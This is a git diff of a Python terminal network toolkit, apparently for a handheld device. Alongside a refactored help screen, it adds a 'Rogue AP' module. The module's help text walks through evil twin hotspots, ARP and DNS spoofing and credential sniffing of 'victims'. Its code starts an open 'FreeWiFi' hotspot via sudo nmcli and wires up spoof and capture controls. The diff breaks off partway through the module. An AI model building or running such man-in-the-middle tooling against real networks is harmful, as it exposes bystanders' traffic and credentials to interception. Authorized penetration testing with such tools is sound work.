@@ -4,7 +4,7 @@ NetRunner v3.0 - Cyberpunk Network Toolkit
 A TUI network testing tool for the Cyberboy handheld.
 
 Keybindings:
-  1-0,-,=: Switch between 12 modules
+  1-0,-,=,\\: Switch between 13 modules
   ←/→: Previous/Next tab
   ↑/↓: Navigate between fields
   PgUp/PgDn: Scroll results
@@ -302,30 +302,13 @@ class WrappingRichLog(RichLog):
         return super().write(content, *args, **kwargs)
 
 
-class HelpScreen(ModalScreen):
-    """Help overlay screen."""
+HELP_PAGES = {
+    "keys": """[bold cyan]KEYBINDINGS[/bold cyan]
 
-    BINDINGS = [
-        Binding("escape", "dismiss", "Close"),
-        Binding("question_mark", "dismiss", "Close"),
-    ]
-
-    def compose(self) -> ComposeResult:
-        yield VerticalScroll(
-            Static("""[bold cyan]
-    _   __     __  ____
-   / | / /__  / /_/ __ \\__  ______  ____  ___  _____
-  /  |/ / _ \\/ __/ /_/ / / / / __ \\/ __ \\/ _ \\/ ___/
- / /|  /  __/ /_/ _, _/ /_/ / / / / / / /  __/ /
-/_/ |_/\\___/\\__/_/ |_|\\__,_/_/ /_/_/ /_/\\___/_/
-                                            v3.0
-[/bold cyan]""", classes="ascii-title"),
-            Static("\n[bold magenta]KEYBINDINGS[/bold magenta]", classes="help-title"),
-            Static("""
-[yellow]1-0,-,=[/yellow] Switch between 12 modules
+[yellow]1-0,-,=,\\[/yellow] Switch between 13 modules
 [yellow]← / →[/yellow]   Previous / Next tab
 [yellow]↑ / ↓[/yellow]   Navigate between fields
-[yellow]PgUp/Dn[/yellow] Scroll results (and this help!)
+[yellow]PgUp/Dn[/yellow] Scroll results
 [yellow]Tab[/yellow]     Move to next field
 [yellow]Enter[/yellow]   Execute current action
 [yellow]Esc[/yellow]     Cancel or go back
@@ -335,222 +318,446 @@ class HelpScreen(ModalScreen):
 [yellow]s[/yellow]       Save results to text file
 [yellow]j[/yellow]       Save results to JSON file
 [yellow]m[/yellow]       Toggle sound effects
-            """),
-            Static("\n[bold magenta]MODULE REFERENCE[/bold magenta]", classes="help-title"),
-            Static("""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][1] SCANNER[/bold cyan] - Network Discovery & Port Scanning
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Input:[/green] Target IP/CIDR (e.g., 192.168.1.0/24)
-       Ports (optional, e.g., 22,80,443)
+
+[bold cyan]QUICK REFERENCE[/bold cyan]
+
+[yellow]Recon:[/yellow] Scanner → DNS/SSL → Geo → Security
+[yellow]Monitor:[/yellow] WiFi → Monitor → Packets
+[yellow]Attack:[/yellow] Scanner → RogueAP → Packets
+[yellow]Debug:[/yellow] Ping → Trace → Speed → WiFi
+
+[bold cyan]SAVING RESULTS[/bold cyan]
+
+Location: ~/netrunner-results/
+[s] Save as text | [j] Save as JSON""",
+
+    "scanner": """[bold cyan][1] SCANNER[/bold cyan] - Network Discovery
+
+Discover devices and scan ports using nmap.
+
+[green]Input:[/green]
+• Target - IP (192.168.1.1) or CIDR (/24)
+• Ports - Optional (22,80,443)
 
 [green]Scan Types:[/green]
-• Ping Sweep - Find live hosts on network
-• ARP Scan   - Discover local devices (faster)
-• TCP Top 100 - Scan common TCP ports
-• UDP Top 20  - Scan common UDP ports
-• Services    - Detect running services
+• Ping Sweep - Find live hosts (ICMP)
+• ARP Scan - Local network only, shows MACs
+• TCP Top 100 - Common TCP ports
+• UDP Top 20 - Common UDP (needs sudo)
+• Services - Detect software versions
 
 [green]Buttons:[/green]
-• [Scan]  - Run selected scan type
-• [Local] - Auto-detect and scan your network
+• [Scan] - Run selected scan
+• [Local] - Auto-detect & scan your network
 • [Clear] - Clear results
 
-[green]Tip:[/green] ARP scan only works on local network.
-MAC addresses are auto-resolved to vendors.
+[green]How to scan your network:[/green]
+1. Press [Local] to auto-detect
+2. ARP scan runs, shows devices
+3. Pick an IP, select TCP Top 100
+4. Press [Scan] to find open ports
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][2] DNS/SSL[/bold cyan] - Domain & Certificate Analysis
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Input:[/green] Domain name (e.g., example.com)
+[green]Colors:[/green] [green]Green[/green]=open [yellow]Yellow[/yellow]=filtered""",
+
+    "dns": """[bold cyan][2] DNS/SSL[/bold cyan] - Domain Analysis
+
+Query DNS records and check SSL certificates.
+
+[green]Input:[/green] Domain name (example.com)
+Do NOT include http:// or paths
 
 [green]Record Types:[/green]
-• A   - IPv4 address records
-• MX  - Mail server records
-• NS  - Nameserver records
-• TXT - Text records (SPF, DKIM, etc.)
+• A - IPv4 addresses
+• AAAA - IPv6 addresses
+• MX - Mail servers
+• NS - Nameservers
+• TXT - SPF, DKIM, verification
+• CNAME - Aliases
+• SOA - Authority record
 
 [green]Buttons:[/green]
-• [Lookup] - Query selected DNS record type
-• [WHOIS]  - Domain registration info
-• [SSL]    - Check SSL/TLS certificate
-• [Clear]  - Clear results
+• [Lookup] - Query selected record type
+• [WHOIS] - Registration info
+• [SSL] - Certificate details
+• [Clear] - Clear results
 
-[green]Tip:[/green] SSL check shows expiry, issuer,
-and certificate chain details.
+[green]SSL Output:[/green]
+• Subject/Issuer, valid dates
+• Days until expiration
+• SANs (alternate names)
+• Certificate chain""",
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][3] WiFi[/bold cyan] - Wireless Network Analysis
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Buttons:[/green]
-• [Scan]     - List nearby WiFi networks
-• [Info]     - Current connection details
-• [BW Mon]   - Live bandwidth monitor (toggle)
-• [Channels] - WiFi channel usage analysis
-• [Signal]   - Signal strength over time
-• [Hidden]   - Detect hidden networks
-• [Clear]    - Stop monitoring & clear
+    "wifi": """[bold cyan][3] WiFi[/bold cyan] - Wireless Analysis
 
-[green]Tip:[/green] BW Mon shows a live sparkline graph.
-Press again to stop monitoring.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][4] PING[/bold cyan] - Connectivity Testing
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Input:[/green] Target IP or hostname
-       Count (number of pings, default: 5)
+Analyze WiFi networks and monitor bandwidth.
 
 [green]Buttons:[/green]
-• [Ping]  - Send ICMP echo requests
+• [Scan] - List nearby networks
+• [Info] - Current connection details
+• [BW Mon] - Live bandwidth graph (toggle)
+• [Channels] - Channel utilization
+• [Signal] - Signal strength over time
+• [Hidden] - Find hidden networks
+• [Clear] - Stop & clear
+
+[green]Scan Output:[/green]
+SSID | Signal% | Security | Channel | Freq
+
+[green]Signal Colors:[/green]
+[green]>70%[/green] strong | [yellow]40-70%[/yellow] ok | [red]<40%[/red] weak
+
+[green]Tips:[/green]
+• Channels 1, 6, 11 don't overlap (2.4GHz)
+• 5GHz has more channels
+• BW Mon shows sparkline graph""",
+
+    "ping": """[bold cyan][4] PING[/bold cyan] - Connectivity Testing
+
+Test connectivity with ICMP ping and traceroute.
+
+[green]Input:[/green]
+• Target - IP or hostname
+• Count - Number of pings (default: 5)
+
+[green]Buttons:[/green]
+• [Ping] - Send ICMP echo requests
 • [Trace] - Traceroute to target
-• [Stop]  - Cancel running operation
+• [Stop] - Cancel operation
 
-[green]Tip:[/green] Latency is color-coded:
-  Green <50ms | Yellow <100ms | Red >100ms
+[green]Troubleshooting Steps:[/green]
+1. Ping gateway (router) - local network
+2. Ping 8.8.8.8 - internet connectivity
+3. Ping google.com - DNS resolution
+4. Traceroute - find where it fails
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][5] SPEED[/bold cyan] - Internet Speed Testing
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Server Select:[/green] Tele2, Cloudflare, Hetzner
+[green]Latency Colors:[/green]
+[green]<50ms[/green] excellent
+[yellow]50-100ms[/yellow] acceptable
+[red]>100ms[/red] high latency
 
-[green]Buttons:[/green]
-• [Download]  - Test download speed (10MB)
-• [Upload]    - Test upload speed
-• [Full Test] - Download + Upload combined
-• [Latency]   - Multi-server ping test
+[green]Traceroute:[/green]
+• Shows each hop to destination
+• * * * = hop didn't respond""",
 
-[green]Tip:[/green] Latency test pings multiple servers
-to compare response times by region.
+    "speed": """[bold cyan][5] SPEED[/bold cyan] - Internet Speed Test
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][6] MONITOR[/bold cyan] - Network Traffic & Connections
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Buttons:[/green]
-• [Conns]   - Active TCP/UDP connections
-• [Traffic] - Interface RX/TX statistics
-• [Ports]   - Listening ports & services
-• [VPN]     - VPN/Tailscale status
-• [Process] - Network usage per process
-• [Talkers] - Top bandwidth consumers
-• [Sockets] - Detailed socket statistics
+Test download/upload speeds and latency.
 
-[green]Tip:[/green] Connection states are color-coded:
-  Green=ESTABLISHED | Yellow=LISTEN
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][7] TOOLS[/bold cyan] - Network Utilities
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Input:[/green] CIDR, MAC address, or hostname
-       (depends on selected function)
+[green]Servers:[/green] Tele2, Cloudflare, Hetzner
 
 [green]Buttons:[/green]
-• [Subnet] - Calculate subnet info from CIDR
-• [WoL]    - Send Wake-on-LAN magic packet
-• [mDNS]   - Browse local mDNS services
-• [ARP]    - View ARP table
-• [Routes] - View routing table
-• [Hosts]  - View /etc/hosts file
-• [Ifaces] - Network interface details
+• [Download] - Download speed (10MB file)
+• [Upload] - Upload speed test
+• [Full Test] - Both download + upload
+• [Latency] - Ping multiple servers
 
-[green]Tip:[/green] For Subnet, enter CIDR like 192.168.1.0/24
-For WoL, enter MAC like AA:BB:CC:DD:EE:FF
+[green]Output:[/green]
+• Speed in Mbps
+• Transfer time
+• Progress during test
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][8] GEO[/bold cyan] - IP Geolocation
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Input:[/green] IP address (leave blank for your IP)
+[green]Latency Test:[/green]
+Pings servers in different regions
+Shows min/avg/max to each
+
+[green]Tips:[/green]
+• Close other apps during test
+• WiFi slower than ethernet
+• Test at different times""",
+
+    "monitor": """[bold cyan][6] MONITOR[/bold cyan] - Network Monitoring
+
+Monitor connections, traffic, and processes.
+
+[green]Buttons:[/green]
+• [Conns] - Active TCP/UDP connections
+• [Traffic] - Interface RX/TX stats
+• [Ports] - Listening ports & services
+• [VPN] - VPN/Tailscale status
+• [Process] - Network per process
+• [Talkers] - Top bandwidth users
+• [Sockets] - Socket statistics
+
+[green]Connection States:[/green]
+[green]ESTABLISHED[/green] - Active connection
+[yellow]LISTEN[/yellow] - Waiting for connections
+TIME_WAIT - Closing
+CLOSE_WAIT - Remote closed
+
+[green]Investigate unknown connections:[/green]
+1. [Conns] - see all connections
+2. [Ports] - what's listening
+3. [Process] - identify apps""",
+
+    "tools": """[bold cyan][7] TOOLS[/bold cyan] - Network Utilities
+
+Subnet calc, Wake-on-LAN, mDNS, and more.
+
+[green]Input:[/green] CIDR, MAC, or hostname
+
+[green]Buttons:[/green]
+• [Subnet] - Calculate subnet info
+  Enter: 192.168.1.0/24
+• [WoL] - Wake-on-LAN packet
+  Enter: AA:BB:CC:DD:EE:FF
+• [mDNS] - Browse local services
+• [ARP] - ARP cache table
+• [Routes] - Routing table
+• [Hosts] - /etc/hosts file
+• [Ifaces] - Interface details
+
+[green]Subnet Output:[/green]
+Network, broadcast, netmask, host range,
+number of hosts, wildcard mask
+
+[green]Wake-on-LAN:[/green]
+1. Device must support WoL
+2. Enable in BIOS/UEFI
+3. Same LAN or forwarded
+4. Enter MAC, press [WoL]""",
+
+    "geo": """[bold cyan][8] GEO[/bold cyan] - IP Geolocation
+
+Lookup geographic location of IP addresses.
+
+[green]Input:[/green] IP address (blank = your IP)
 
 [green]Buttons:[/green]
 • [Lookup] - Geolocate entered IP
-• [My IP]  - Lookup your public IP
-• [Clear]  - Clear results
+• [My IP] - Lookup your public IP
+• [Clear] - Clear results
 
-[green]Output:[/green] Country, region, city, coordinates,
-timezone, ISP, organization, and AS number.
-Also detects VPN/proxy and mobile networks.
+[green]Output:[/green]
+• Country, region, city
+• Coordinates (lat/long)
+• Timezone
+• ISP, organization
+• AS number
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][9] HTTP[/bold cyan] - HTTP Request Testing
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Input:[/green] URL (https:// added if omitted)
-[green]Method:[/green] GET, HEAD, or POST
+[green]Flags:[/green]
+[yellow]Proxy/VPN[/yellow] - Using VPN detected
+[yellow]Hosting[/yellow] - Datacenter IP
+[yellow]Mobile[/yellow] - Mobile carrier
+
+[green]Use cases:[/green]
+• Identify attack origins
+• Verify VPN is working
+• Find server locations""",
+
+    "http": """[bold cyan][9] HTTP[/bold cyan] - HTTP Request Testing
+
+Send HTTP requests and analyze responses.
+
+[green]Input:[/green]
+• URL - https:// added if missing
+• Method - GET, HEAD, POST
 
 [green]Buttons:[/green]
-• [Send]      - Send HTTP request
-• [Headers]   - View response headers only
+• [Send] - Send request, show response
+• [Headers] - Headers only (faster)
 • [Redirects] - Trace redirect chain
-• [Clear]     - Clear results
+• [Clear] - Clear results
 
-[green]Output:[/green] Status code, response time, size,
-download speed, and remote IP address.
+[green]Output:[/green]
+• Status code (200, 404, etc.)
+• Response time (ms)
+• Content size, download speed
+• Remote IP address
+• Response headers
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][0] SECURITY[/bold cyan] - Security Analysis
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Input:[/green] Target hostname or URL
-       Port (for banner grab, default: 22)
+[green]Status Codes:[/green]
+[green]200[/green] OK | [yellow]301/302[/yellow] Redirect
+[yellow]401[/yellow] Unauthorized | [yellow]403[/yellow] Forbidden
+[red]404[/red] Not found | [red]500[/red] Server error""",
+
+    "security": """[bold cyan][0] SECURITY[/bold cyan] - Security Analysis
+
+Check HTTP headers, email security, banners.
+
+[green]Input:[/green]
+• Target - Hostname or URL
+• Port - For banner grab (default: 22)
 
 [green]Buttons:[/green]
-• [HTTP Sec]  - Check HTTP security headers
-• [Email Sec] - Check SPF/DKIM/DMARC records
-• [Banner]    - Grab service banner
-• [Clear]     - Clear results
+• [HTTP Sec] - HTTP security headers
+• [Email Sec] - SPF/DKIM/DMARC
+• [Banner] - Grab service banner
+• [Clear] - Clear results
 
-[green]HTTP Security checks:[/green]
-HSTS, X-Frame-Options, CSP, X-Content-Type,
-X-XSS-Protection, Referrer-Policy, Permissions
+[green]HTTP Security Headers:[/green]
+• HSTS - Force HTTPS
+• X-Frame-Options - Clickjacking
+• CSP - Resource loading
+• X-Content-Type-Options - MIME sniff
+• X-XSS-Protection - XSS filter
+• Referrer-Policy - Referrer info
 
-[green]Email Security checks:[/green]
-SPF, DKIM, DMARC records for domain
+[green]Email Security:[/green]
+• SPF - Authorized senders
+• DKIM - Signature verification
+• DMARC - Failure policy
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][-] BLUETOOTH[/bold cyan] - Bluetooth Scanner
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[green]Output:[/green] [green]Green[/green]=present [red]Red[/red]=missing""",
+
+    "bluetooth": """[bold cyan][-] BLUETOOTH[/bold cyan] - Bluetooth Scanner
+
+Scan for nearby Bluetooth devices.
+
 [green]Buttons:[/green]
-• [Scan]   - Scan for nearby devices (10s)
+• [Scan] - Scan nearby (takes ~10s)
 • [Paired] - List paired devices
-• [Info]   - Bluetooth controller info
-• [Clear]  - Clear results
+• [Info] - Controller info
+• [Clear] - Clear results
 
-[green]Tip:[/green] Scan takes ~10 seconds to discover
-nearby Bluetooth devices. Press again to stop.
+[green]Scan Output:[/green]
+• Device MAC address
+• Device name (if broadcast)
+• Device type/class
+• Signal strength (RSSI)
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold cyan][=] PACKETS[/bold cyan] - Live Packet Capture
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[green]Input:[/green] Interface (default: any)
-       Filter (tcpdump syntax)
-       Count (packets to capture, 0=unlimited)
+[green]Device Types:[/green]
+Phone, Computer, Audio, Peripheral,
+Wearable, Imaging
+
+[green]Controller Info:[/green]
+• Adapter MAC and name
+• Power state
+• Discoverable/Pairable state
+
+[green]Tips:[/green]
+• Some devices hide names
+• RSSI closer to 0 = stronger""",
+
+    "packets": """[bold cyan][=] PACKETS[/bold cyan] - Packet Capture
+
+Capture packets with tcpdump. Requires sudo.
+
+[green]Input:[/green]
+• Iface - Interface (any, wlan0, eth0)
+• Filter - tcpdump filter syntax
+• Count - Packets to capture (0=unlimited)
 
 [green]Buttons:[/green]
-• [Capture] - Start packet capture
-• [Stop]    - Stop capture
-• [Conns]   - Show unique connections
-• [Clear]   - Clear results
+• [Capture] - Start capture
+• [Stop] - Stop capture
+• [Conns] - Summarize connections
+• [Clear] - Clear results
 
-[green]Filter examples:[/green]
-  port 80          - HTTP traffic
-  port 443         - HTTPS traffic
-  host 192.168.1.1 - Specific host
-  icmp             - Ping packets
-  tcp              - TCP only
-  udp              - UDP only
+[green]Filter Examples:[/green]
+port 80        - HTTP
+port 443       - HTTPS
+host 10.0.0.1  - Specific host
+icmp           - Ping packets
+tcp/udp        - Protocol only
+not port 22    - Exclude SSH
 
-[green]Tip:[/green] Requires sudo. Capture runs until
-count reached or [Stop] pressed.
+[green]Combine:[/green]
+port 80 or port 443
+host X and port 80
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[bold magenta]SAVING RESULTS[/bold magenta]
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Results are saved to: ~/netrunner-results/
-• Press [s] to save as text file
-• Press [j] to save as JSON file
+[green]Colors:[/green]
+[green]HTTP[/green] [cyan]HTTPS[/cyan] [yellow]DNS[/yellow] [magenta]SSH[/magenta] [red]Telnet[/red]""",
 
-[muted]Scroll with PgUp/PgDn | Press Esc or ? to close[/muted]
-            """),
+    "rogueap": """[bold cyan][\\] ROGUE AP[/bold cyan] - Evil Twin / MITM
+[bold red]FOR AUTHORIZED TESTING ONLY![/bold red]
+
+[green]Input:[/green]
+• SSID - Fake AP name (FreeWiFi)
+• Password - Blank for open network
+• Spoof target - IP for ARP spoof
+• DNS redirect - Your IP for DNS spoof
+• Interface - wlan0
+
+[green]Buttons:[/green]
+• [Start AP] - Create hotspot
+• [Stop AP] - Shutdown hotspot
+• [Clients] - Show connected victims
+• [ARP Spoof] - Poison ARP caches
+• [DNS Spoof] - Redirect all DNS
+• [Capture] - Sniff credentials
+• [Clear] - Stop all
+
+[bold green]EVIL TWIN:[/bold green]
+1. Set SSID: "FreeWiFi"
+2. Leave password blank
+3. [Start AP] → wait for victims
+4. [Clients] → see connections
+5. [Capture] → sniff traffic
+
+[bold green]ARP SPOOF:[/bold green]
+1. Join target's network
+2. Find target IP (Scanner)
+3. Enter in "Spoof target"
+4. [ARP Spoof] → MITM active
+
+[bold green]DNS SPOOF:[/bold green]
+1. Set up web server
+2. Enter your IP in DNS redirect
+3. [DNS Spoof] → all domains→you"""
+}
+
+
+class HelpScreen(ModalScreen):
+    """Paginated help screen for better performance."""
+
+    BINDINGS = [
+        Binding("escape", "dismiss", "Close"),
+        Binding("question_mark", "dismiss", "Close"),
+        Binding("left", "prev_page", "Prev"),
+        Binding("right", "next_page", "Next"),
+    ]
+
+    PAGE_ORDER = ["keys", "scanner", "dns", "wifi", "ping", "speed",
+                  "monitor", "tools", "geo", "http", "security",
+                  "bluetooth", "packets", "rogueap"]
+
+    def compose(self) -> ComposeResult:
+        yield Vertical(
+            Static("[bold cyan]NETRUNNER HELP[/bold cyan] [muted]← → to navigate | Esc to close[/muted]", id="help-header"),
+            Select([
+                ("Keybindings & Quick Ref", "keys"),
+                ("[1] Scanner", "scanner"),
+                ("[2] DNS/SSL", "dns"),
+                ("[3] WiFi", "wifi"),
+                ("[4] Ping", "ping"),
+                ("[5] Speed", "speed"),
+                ("[6] Monitor", "monitor"),
+                ("[7] Tools", "tools"),
+                ("[8] Geo", "geo"),
+                ("[9] HTTP", "http"),
+                ("[0] Security", "security"),
+                ("[-] Bluetooth", "bluetooth"),
+                ("[=] Packets", "packets"),
+                ("[\\] RogueAP", "rogueap"),
+            ], id="help-select", value="keys"),
+            Static(HELP_PAGES["keys"], id="help-content"),
             id="help-container",
             classes="help-overlay",
         )
+
+    @on(Select.Changed, "#help-select")
+    def on_page_select(self, event: Select.Changed) -> None:
+        page = event.value
+        if page in HELP_PAGES:
+            self.query_one("#help-content", Static).update(HELP_PAGES[page])
+
+    def action_prev_page(self) -> None:
+        select = self.query_one("#help-select", Select)
+        current = select.value
+        if current in self.PAGE_ORDER:
+            idx = self.PAGE_ORDER.index(current)
+            new_idx = (idx - 1) % len(self.PAGE_ORDER)
+            select.value = self.PAGE_ORDER[new_idx]
+            self.query_one("#help-content", Static).update(HELP_PAGES[self.PAGE_ORDER[new_idx]])
+
+    def action_next_page(self) -> None:
+        select = self.query_one("#help-select", Select)
+        current = select.value
+        if current in self.PAGE_ORDER:
+            idx = self.PAGE_ORDER.index(current)
+            new_idx = (idx + 1) % len(self.PAGE_ORDER)
+            select.value = self.PAGE_ORDER[new_idx]
+            self.query_one("#help-content", Static).update(HELP_PAGES[self.PAGE_ORDER[new_idx]])
 
 
 class ScannerModule(Container):
@@ -3562,6 +3769,465 @@ class GeoModule(Container):
             status.update("[red]Lookup failed[/red]")
 
 
+class RogueAPModule(Container):
+    """Rogue AP / MITM attack module for authorized pentesting."""
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self._ap_active = False
+        self._arp_spoofing = False
+        self._dns_spoofing = False
+        self._capture_proc = None
+
+    def compose(self) -> ComposeResult:
+        yield Horizontal(
+            Vertical(
+                Input(placeholder="SSID", id="ap-ssid", value="FreeWiFi"),
+                Input(placeholder="Password (blank=open)", id="ap-password"),
+                Input(placeholder="Spoof target IP", id="ap-spoof-target"),
+                Input(placeholder="DNS redirect IP", id="ap-dns-redirect"),
+                Select([
+                    ("wlan0", "wlan0"),
+                    ("eth0", "eth0"),
+                ], id="ap-iface", value="wlan0"),
+                Button("Start AP", id="btn-ap-start", variant="primary"),
+                Button("Stop AP", id="btn-ap-stop", variant="error"),
+                Button("Clients", id="btn-ap-clients"),
+                Button("ARP Spoof", id="btn-arp-spoof"),
+                Button("DNS Spoof", id="btn-dns-spoof"),
+                Button("Capture", id="btn-ap-capture"),
+                Button("Clear", id="btn-ap-clear"),
+                Static("", id="ap-status"),
+                classes="sidebar",
+            ),
+            WrappingRichLog(id="ap-results", highlight=True, markup=True, wrap=True, classes="main-output"),
+            classes="module-layout",
+        )
+
+    @on(Button.Pressed, "#btn-ap-start")
+    def start_ap(self) -> None:
+        if self._ap_active:
+            self.query_one("#ap-status", Static).update("[yellow]AP already running[/yellow]")
+            return
+        ssid = self.query_one("#ap-ssid", Input).value.strip() or "FreeWiFi"
+        password = self.query_one("#ap-password", Input).value.strip()
+        iface = self.query_one("#ap-iface", Select).value
+        self.run_start_ap(ssid, password, iface)
+
+    @on(Button.Pressed, "#btn-ap-stop")
+    def stop_ap(self) -> None:
+        self.run_stop_ap()
+
+    @on(Button.Pressed, "#btn-ap-clients")
+    def show_clients(self) -> None:
+        self.run_show_clients()
+
+    @on(Button.Pressed, "#btn-arp-spoof")
+    def toggle_arp_spoof(self) -> None:
+        target = self.query_one("#ap-spoof-target", Input).value.strip()
+        if not target:
+            self.query_one("#ap-status", Static).update("[red]Enter target IP[/red]")
+            return
+        if self._arp_spoofing:
+            self.stop_arp_spoof()
+        else:
+            self.run_arp_spoof(target)
+
+    @on(Button.Pressed, "#btn-dns-spoof")
+    def toggle_dns_spoof(self) -> None:
+        redirect_ip = self.query_one("#ap-dns-redirect", Input).value.strip()
+        if not redirect_ip:
+            self.query_one("#ap-status", Static).update("[red]Enter redirect IP[/red]")
+            return
+        if self._dns_spoofing:
+            self.stop_dns_spoof()
+        else:
+            self.run_dns_spoof(redirect_ip)
+
+    @on(Button.Pressed, "#btn-ap-capture")
+    def start_capture(self) -> None:
+        self.run_traffic_capture()
+
+    @on(Button.Pressed, "#btn-ap-clear")
+    def clear_results(self) -> None:
+        self.stop_arp_spoof()
+        self.stop_dns_spoof()
+        self.query_one("#ap-results", RichLog).clear()
+        self.query_one("#ap-status", Static).update("")
+
+    @work(exclusive=True)
+    async def run_start_ap(self, ssid: str, password: str, iface: str) -> None:
+        """Start a rogue access point using nmcli."""
+        log = self.query_one("#ap-results", RichLog)
+        status = self.query_one("#ap-status", Static)
+
+        log.clear()
+        log.write("[bold magenta]>>> ROGUE AP MODULE <<<[/bold magenta]")
+        log.write("[yellow]For authorized security testing only![/yellow]\n")
+
+        status.update("[cyan]Starting AP...[/cyan]")
+        log.write(f"[cyan]> Creating hotspot '{ssid}' on {iface}[/cyan]")
+
+        try:
+            # Build nmcli command
+            cmd = ["sudo", "nmcli", "device", "wifi", "hotspot",
+                   "ifname", iface, "ssid", ssid]
+            if password:
+                cmd.extend(["password", password])
+                log.write(f"[cyan]> Security: WPA2 (password protected)[/cyan]")
+            else:
+                log.write(f"[yellow]> Security: OPEN (no password)[/yellow]")
+
+            proc = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, stderr = await proc.communicate()
+
+            if proc.returncode == 0:
+                self._ap_active = True
+                log.write(f"\n[green]AP started successfully![/green]")
+                log.write(f"[green]SSID: {ssid}[/green]")
+
+                # Get the AP IP
+                await asyncio.sleep(2)
+                ip_proc = await asyncio.create_subprocess_exec(
+                    "nmcli", "-t", "-f", "IP4.ADDRESS", "device", "show", iface,
+                    stdout=asyncio.subprocess.PIPE,
+                )
+                ip_out, _ = await ip_proc.communicate()
+                if ip_out:
+                    for line in ip_out.decode().split('\n'):
+                        if 'IP4.ADDRESS' in line:
+                            ap_ip = line.split(':')[1].split('/')[0] if ':' in line else "10.42.0.1"
+                            log.write(f"[green]AP IP: {ap_ip}[/green]")
+                            break
+
+                log.write(f"\n[cyan]Targets connecting will route through this device.[/cyan]")
+                log.write(f"[cyan]Use 'Clients' to see connected devices.[/cyan]")
+                log.write(f"[cyan]Use 'Capture' to sniff traffic.[/cyan]")
+                status.update("[green]AP Active[/green]")
+
+                if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
+                    play_beep(1200, 100)
+            else:
+                error_msg = stderr.decode().strip() if stderr else "Unknown error"
+                log.write(f"[red]Failed to start AP: {error_msg}[/red]")
+                status.update("[red]AP Failed[/red]")
+
+        except Exception as e:
+            log.write(f"[red]Error: {e}[/red]")
+            status.update("[red]AP Failed[/red]")
+
+    @work(exclusive=True)
+    async def run_stop_ap(self) -> None:
+        """Stop the rogue access point."""
+        log = self.query_one("#ap-results", RichLog)
+        status = self.query_one("#ap-status", Static)
+
+        status.update("[cyan]Stopping AP...[/cyan]")
+        log.write("\n[cyan]> Stopping hotspot...[/cyan]")
+
+        try:
+            # Find and delete hotspot connection
+            proc = await asyncio.create_subprocess_exec(
+                "nmcli", "-t", "-f", "NAME,TYPE", "connection", "show",
+                stdout=asyncio.subprocess.PIPE,
+            )
+            stdout, _ = await proc.communicate()
+
+            hotspot_name = None
+            for line in stdout.decode().split('\n'):
+                if 'Hotspot' in line or 'hotspot' in line.lower():
+                    hotspot_name = line.split(':')[0]
+                    break
+
+            if hotspot_name:
+                await asyncio.create_subprocess_exec(
+                    "sudo", "nmcli", "connection", "down", hotspot_name,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                await asyncio.create_subprocess_exec(
+                    "sudo", "nmcli", "connection", "delete", hotspot_name,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+
+            self._ap_active = False
+            log.write("[green]AP stopped[/green]")
+            status.update("[yellow]AP Stopped[/yellow]")
+
+        except Exception as e:
+            log.write(f"[red]Error stopping AP: {e}[/red]")
+            status.update("[red]Stop failed[/red]")
+
+    @work(exclusive=True)
+    async def run_show_clients(self) -> None:
+        """Show connected clients to the AP."""
+        log = self.query_one("#ap-results", RichLog)
+        status = self.query_one("#ap-status", Static)
+
+        status.update("[cyan]Checking clients...[/cyan]")
+        log.write("\n[cyan]> Connected Clients:[/cyan]")
+
+        try:
+            # Check ARP table for clients on AP subnet
